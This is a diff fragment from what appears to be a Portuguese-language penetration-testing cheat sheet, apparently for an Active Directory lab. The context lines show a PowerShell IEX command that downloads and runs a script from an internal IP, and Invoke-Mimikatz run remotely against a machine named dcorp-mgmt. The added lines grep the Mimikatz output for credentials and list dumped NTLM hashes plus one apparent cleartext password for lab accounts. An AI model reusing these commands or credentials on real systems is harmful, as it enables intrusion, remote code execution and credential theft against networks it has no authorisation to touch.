@@ -2739,5 +2739,11 @@ IEX(New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/c
 Invoke-Command -Scriptblock ${function:Invoke-Mimikatz} -session $sess
 Invoke-Command -Scriptblock ${function:Invoke-Mimikatz} -computername dcorp-mgmt
 ```
-
+MIMIKATZ - FILTRAR RESULTADO NO LINUX
+```
+cat  m1.txt| grep -i -E "username|password|domain|ntlm"
+```
+VAI OBTER OS NTLM HASHES:
+- DCORP-MGMT$:639c1adde3e0d1ba0d733c7d0d8f23ec
+- svcadmin:b38ff50264b74508085d82c69794a4d8:ThisisBlasphemyThisisMadness
 
